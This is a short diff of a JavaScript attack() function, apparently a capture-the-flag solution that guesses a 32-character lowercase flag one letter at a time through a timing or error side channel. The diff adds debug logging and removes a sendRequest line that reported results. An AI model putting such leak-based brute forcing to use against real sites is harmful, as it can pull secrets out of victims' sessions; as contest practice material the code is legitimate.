@@ -11,9 +11,11 @@ async function attack() {
     let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
     //suposing the flag is 32 characters long
     let i = 0;
+    console.log("launching")
     while (i < 10001 && noteName.length < 32) {
         let j = 0;
         while (i < 10001 && j < lowercase_letters.length) {
+            console.log("i: ", i, "j: ", j)
             const l = lowercase_letters[j];
             try {
                 await new Promise((resolve, reject) => {
@@ -44,9 +46,10 @@ async function attack() {
             j++;
         }
     }      
-    sendRequest("result=false");
 }
 attack();
+
+
 
 
 </script>
